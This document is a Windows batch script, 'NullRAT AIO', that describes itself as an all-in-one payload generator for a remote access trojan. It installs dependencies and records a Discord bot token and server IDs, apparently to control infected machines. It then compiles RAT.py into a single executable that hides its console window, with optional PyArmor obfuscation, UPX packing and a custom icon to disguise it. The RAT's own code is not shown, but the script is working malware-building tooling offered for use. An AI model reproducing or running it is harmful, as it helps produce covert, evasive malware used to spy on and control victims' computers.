@echo off & @title NullRAT AIO 
cd "%~dp0NullRAT"
setlocal EnableDelayedExpansion
mode con: cols=80 lines=29

:main
cls & echo Press any key to start, C to clean working dir, E to exit:                                              
echo. & echo. & echo. & echo. & echo. &echo.&echo.
echo              _   _       _ _ ____      _  _____      _    ___ ___  
echo             ^| ^\ ^| ^|_   _^| ^| ^|  _ ^\    ^/ ^\^|_   _^|    ^/ ^\  ^|_ _^/ _ ^\ 
echo             ^|  ^\^| ^| ^| ^| ^| ^| ^| ^|_^) ^|  ^/ _ ^\ ^| ^|     ^/ _ ^\  ^| ^| ^| ^| ^|
echo             ^| ^|^\  ^| ^|_^| ^| ^| ^|  _ ^<  ^/ ___ ^\^| ^|    ^/ ___ ^\ ^| ^| ^|_^| ^|
echo             ^|_^| ^\_^|^\__^,_^|_^|_^|_^| ^\_^\^/_^/   ^\_^\_^|   ^/_^/   ^\_^\___^\___^/ 
echo.
echo                     ========================================
echo                    ^|^| ^>^>^> All-In-One Payload Generator ^<^<^< ^|^|
echo                     ========================================
choice /c ECABDFGHIJKLMNOPQRSTUVWXYZ123456789 /n
if %errorlevel%==1 (exit /b 2) 
if %errorlevel%==2 (goto cleanup) else (goto depend)

:depend
@title NullRAT AIO (Dependencies Installer)
cls & echo. & mode con: cols=94 lines=29

echo        ___    ____  _____ ____  _____ _   _ ____  _____ _   _  ____ ___ _____ ____  
echo        / ^\ ^\  ^|  _ ^\^| ____^|  _ ^\^| ____^| ^\ ^| ^|  _ ^\^| ____^| ^\ ^| ^|/ ___^|_ _^| ____/ ___^| 
echo        ^| ^|^| ^| ^| ^| ^| ^|  _^| ^| ^|_) ^|  _^| ^|  ^\^| ^| ^| ^| ^|  _^| ^|  ^\^| ^| ^|    ^| ^|^|  _^| ^\___ ^\ 
echo        ^| ^|^| ^| ^| ^|_^| ^| ^|___^|  __/^| ^|___^| ^|^\  ^| ^|_^| ^| ^|___^| ^|^\  ^| ^|___ ^| ^|^| ^|___ ___) ^|
echo        ^|_^|^| ^| ^|____/^|_____^|_^|   ^|_____^|_^| ^\_^|____/^|_____^|_^| ^\_^|^\____^|___^|_____^|____/ 
echo        /_/                                                                         
echo.
echo ^>^> Would you like to install^/update NullRAT's Dependencies^? [Y^/N]
choice /c YN /n 
if %errorlevel%==2 (
	echo.
	echo Skipping...
	timeout /t 3
	goto vars
) else (
	cls & echo.
	echo        ___    ____  _____ ____  _____ _   _ ____  _____ _   _  ____ ___ _____ ____  
	echo        / ^\ ^\  ^|  _ ^\^| ____^|  _ ^\^| ____^| ^\ ^| ^|  _ ^\^| ____^| ^\ ^| ^|/ ___^|_ _^| ____/ ___^| 
	echo        ^| ^|^| ^| ^| ^| ^| ^|  _^| ^| ^|_^) ^|  _^| ^|  ^\^| ^| ^| ^| ^|  _^| ^|  ^\^| ^| ^|    ^| ^|^|  _^| ^\___ ^\ 
	echo        ^| ^|^| ^| ^| ^|_^| ^| ^|___^|  __/^| ^|___^| ^|^\  ^| ^|_^| ^| ^|___^| ^|^\  ^| ^|___ ^| ^|^| ^|___ ___^) ^|
	echo        ^|_^|^| ^| ^|____/^|_____^|_^|   ^|_____^|_^| ^\_^|____/^|_____^|_^| ^\_^|^\____^|___^|_____^|____/ 
	echo        ^/_^/                                                                         
	echo.                            
	echo ^>^> Would you like to install^/update NullRAT's Dependencies^? [Y^/N]
	
	echo 1^> Installing fixed version of pyinstaller...
	start "" "python" -m pip install pyinstaller==4.10
	timeout /t 3 /nobreak >nul
	echo 2^> Uninstalling incompatible packages...
	start "" "python" -m pip uninstall enum34
	echo 3^> Installing/Upgrading rest of dependencies...
	start "" "python" -m pip install --upgrade virtualenv aiohttp disnake requests mss pyarmor 
	timeout /t 6 /nobreak >nul
	start "" "python" -m pip install --upgrade virtualenv aiohttp disnake requests mss pyarmor
	echo.
	echo ALL DONE!
	timeout /t 5 
	goto vars
)

:vars
mode con: cols=90 lines=30
@title NullRAT AIO (Variables Setter)
cd "%~dp0NullRAT" & mode con: cols=75 lines=29
cls & echo.
echo     ______   __     ___    ____  ___    _    ____  _     _____ ____  
echo    ^|___ ^\ ^\  ^\ ^\   / / ^\  ^|  _ ^\^|_ _^|  / ^\  ^| __ ^)^| ^|   ^| ____/ ___^| 
echo      __^) ^| ^|  ^\ ^\ / / _ ^\ ^| ^|_^) ^|^| ^|  / _ ^\ ^|  _ ^\^| ^|   ^|  _^| ^\___ ^\ 
echo     / __/^| ^|   ^\ V / ___ ^\^|  _ ^< ^| ^| / ___ ^\^| ^|_^) ^| ^|___^| ^|___ ___^) ^|
echo    ^|_____^| ^|    ^\_/_/   ^\_^\_^| ^\_^\___/_/   ^\_^\____/^|_____^|_____^|____/ 
echo          /_/                                                          

IF EXIST "Variables.py" (goto fileE) else (goto a)

:fileE
echo.
echo A pre-existing variables file was detected.
choice /c YN /n /m "Do you want to check its contents? [Y/N]"
if %errorlevel%==2 (
	cls & echo.
	echo     ______   __     ___    ____  ___    _    ____  _     _____ ____  
	echo    ^|___ ^\ ^\  ^\ ^\   / / ^\  ^|  _ ^\^|_ _^|  / ^\  ^| __ ^)^| ^|   ^| ____/ ___^| 
	echo      __^) ^| ^|  ^\ ^\ / / _ ^\ ^| ^|_^) ^|^| ^|  / _ ^\ ^|  _ ^\^| ^|   ^|  _^| ^\___ ^\ 
	echo     / __/^| ^|   ^\ V / ___ ^\^|  _ ^< ^| ^| / ___ ^\^| ^|_^) ^| ^|___^| ^|___ ___^) ^|
	echo    ^|_____^| ^|    ^\_/_/   ^\_^\_^| ^\_^\___/_/   ^\_^\____/^|_____^|_____^|____/ 
	echo          /_/                
	echo.
	goto a
)

if %errorlevel%==1 (goto endd)

:a
echo.
echo Obtaining information for Variables.py ...
echo ==========================================
echo.
set /p "token=Enter Bot Token: "
if "%token%"=="" (cls & echo [ERROR] Token cannot be empty! & goto createF)
set /p "notification=Enter Notification ID: "
if "%notification%"=="" (cls & echo [ERROR] Notification cannot be empty! & goto createF)
set /p "server=Enter Server ID: "
if "%server%"=="" (cls & echo [ERROR] Server cannot be empty! & goto createF)

echo ^# This file was auto-generated by NullRAT Variables^. DO NOT SHARE^! > Variables.py
echo bot_token = ^"%token%^" >> Variables.py
echo notification_channel = %notification% >> Variables.py
echo server_ids = ^[%server%^] >> Variables.py

echo. & echo Variables file successfully created!
timeout /t 3
goto compiler

:endd
echo. & type Variables.py & echo.
choice /c YN /n /m "Are all these information correct? [Y/N]"
if %errorlevel%==2 (
	cls & echo.
	echo     ______   __     ___    ____  ___    _    ____  _     _____ ____  
	echo    ^|___ ^\ ^\  ^\ ^\   / / ^\  ^|  _ ^\^|_ _^|  / ^\  ^| __ ^)^| ^|   ^| ____/ ___^| 
	echo      __^) ^| ^|  ^\ ^\ / / _ ^\ ^| ^|_^) ^|^| ^|  / _ ^\ ^|  _ ^\^| ^|   ^|  _^| ^\___ ^\ 
	echo     / __/^| ^|   ^\ V / ___ ^\^|  _ ^< ^| ^| / ___ ^\^| ^|_^) ^| ^|___^| ^|___ ___^) ^|
	echo    ^|_____^| ^|    ^\_/_/   ^\_^\_^| ^\_^\___/_/   ^\_^\____/^|_____^|_____^|____/ 
	echo          /_/                
	goto a
)
if %errorlevel%==1 (	
	echo. & echo The following information is correct.
	timeout /t 2 & goto compiler
)

:a
echo.
echo Obtaining information for Variables.py ...
echo ==========================================
echo.
set /p "token=Enter Bot Token: "
if "%token%"=="" (cls & echo [ERROR] Token cannot be empty! & goto createF)
set /p "notification=Enter Notification ID: "
if "%notification%"=="" (cls & echo [ERROR] Notification cannot be empty! & goto createF)
set /p "server=Enter Server ID: "
if "%server%"=="" (cls & echo [ERROR] Server cannot be empty! & goto createF)

cd "%~dp0NullRAT"
echo ^# This file was auto-generated by NullRAT Variables^. DO NOT SHARE^! > Variables.py
echo bot_token = ^"%token%^" >> Variables.py
echo notification_channel = %notification% >> Variables.py
echo server_ids = ^[%server%^] >> Variables.py

echo. & echo Variables file successfully created!
timeout /t 3
goto compiler

:compiler
@title NullRAT AIO (Compiler)
cls & echo.
echo       _______     ____ ___  __  __ ____ ___ _     _____ ____  
echo      ^|___ /^\ ^\   / ___/ _ ^\^|  ^\/  ^|  _ ^\_ _^| ^|   ^| ____^|  _ ^\ 
echo        ^|_ ^\ ^| ^| ^| ^|  ^| ^| ^| ^| ^|^\/^| ^| ^|_^) ^| ^|^| ^|   ^|  _^| ^| ^|_^) ^|
echo       ___^) ^|^| ^| ^| ^|__^| ^|_^| ^| ^|  ^| ^|  __/^| ^|^| ^|___^| ^|___^|  _ ^< 
echo      ^|____/ ^| ^|  ^\____^\___/^|_^|  ^|_^|_^|  ^|___^|_____^|_____^|_^| ^\_^\
echo             /_/                                                

echo.
echo ^>^> Options:
echo -----------
echo.

choice /c YN /n /m "Do you want to obfuscate the executable? [Y/N]: "
if %errorlevel%==1 (set pyarmor=yes) 
if %errorlevel%==2 (set pyarmor=no)

choice /c YN /n /m "Do you want to compress the executable? [Y/N]: "
if %errorlevel%==1 (set upxdd=yes)
if %errorlevel%==2 (set upxdd=no)

choice /c YN /n /m "Do you want to add a custom icon? [Y/N]: "
if %errorlevel%==1 (set icon=yes) 
if %errorlevel%==2 (set icon=no)

echo.
echo [0;36mAll options selected:
echo --------------------------------------------[0m
echo Obfuscating the executable="%pyarmor%"
echo Compressing the executable="%upxdd%"
echo Adding a custom icon to the executable="%icon%"
echo [0;36m--------------------------------------------[0m

echo. & choice /c YN /n /m "Are all these options correct? [Y/N]: "
if %errorlevel%==2 (goto compiler) else (goto compile)

:compile
cls & echo.
echo       _______     ____ ___  __  __ ____ ___ _     _____ ____  
echo      ^|___ /^\ ^\   / ___/ _ ^\^|  ^\/  ^|  _ ^\_ _^| ^|   ^| ____^|  _ ^\ 
echo        ^|_ ^\ ^| ^| ^| ^|  ^| ^| ^| ^| ^|^\/^| ^| ^|_^) ^| ^|^| ^|   ^|  _^| ^| ^|_^) ^|
echo       ___^) ^|^| ^| ^| ^|__^| ^|_^| ^| ^|  ^| ^|  __/^| ^|^| ^|___^| ^|___^|  _ ^< 
echo      ^|____/ ^| ^|  ^\____^\___/^|_^|  ^|_^|_^|  ^|___^|_____^|_____^|_^| ^\_^\
echo             /_/             
echo.

if "!icon!"=="yes" (
	set /P "iconP=Please type the path of the custom icon: " 
	move "!iconP!" "%~dp0\NullRAT\custom_icon.ico"
)
if "!upxdd!"=="yes" (set "path=!path!;%~dp0\NullRAT\upx;%~dp0\upx")

cd "%~dp0"
set "folder=compiling-%random%"
mkdir "!folder!" & cd "NullRAT"
copy *.* ..\"!folder!"
copy "modules\*.*" ..\"!folder!"

cd modules

set "main_arg=pyinstaller --onefile --noconsole --icon=custom_icon.ico --hidden-import mss"
set "main_arg3=pyarmor pack --clean -e " --onefile --noconsole --icon=custom_icon.ico --hidden-import mss"

set "main_arg2=pyinstaller --onefile --noconsole --hidden-import mss"
set "main_arg4=pyarmor pack -e " --onefile --noconsole --hidden-import mss"

for %%i in (*) do set "main_arg=!main_arg! --add-data %%~nxi;."
for %%i in (*) do set "main_arg2=!main_arg2! --add-data %%~nxi;."
for %%i in (*) do set "main_arg3=!main_arg3! --add-data %%~nxi;."
for %%i in (*) do set "main_arg4=!main_arg4! --add-data %%~nxi;."

set "main_arg=!main_arg! RAT.py"
set "main_arg2=!main_arg2! RAT.py"
set "main_arg3=!main_arg3! " RAT.py"
set "main_arg4=!main_arg4! " RAT.py"

cd "%~dp0!folder!"

if "!pyarmor!"=="yes" (
	if "!icon!"=="yes" (
		!main_arg3!
	) else (
		!main_arg4!
	)
) else (
	if "!icon!"=="yes" (
		!main_arg!
	) else (
		!main_arg2!
	)
)

move dist\RAT.exe "%~dp0\" & echo.
cd "%~dp0\"
rmdir /s /q "!folder!"
timeout /t 2

exit

:cleanup
cd "%~dp0"
if exist "NullRAT\" (
	move NullRAT\custom_icon.ico "%~dp0"
	move NullRAT\RAT.py "%~dp0"
	move NullRAT\modules "%~dp0"
	move NullRAT\upx\upx.exe "%~dp0"
	rmdir /s /q NullRAT
)
attrib -h ".git"
del README.md
del "Getting Variables".md
del .gitignore
if exist RAT.exe (del RAT.exe)
rmdir /s /q ".git"
rmdir /s /q "build"
rmdir /s /q "dist"

mkdir NullRAT
move custom_icon.ico "%~dp0\NullRAT"
move RAT.py "%~dp0\NullRAT"
move modules "%~dp0\NullRAT"
mkdir NullRAT\upx
move upx.exe "%~dp0\NullRAT\upx"

goto main
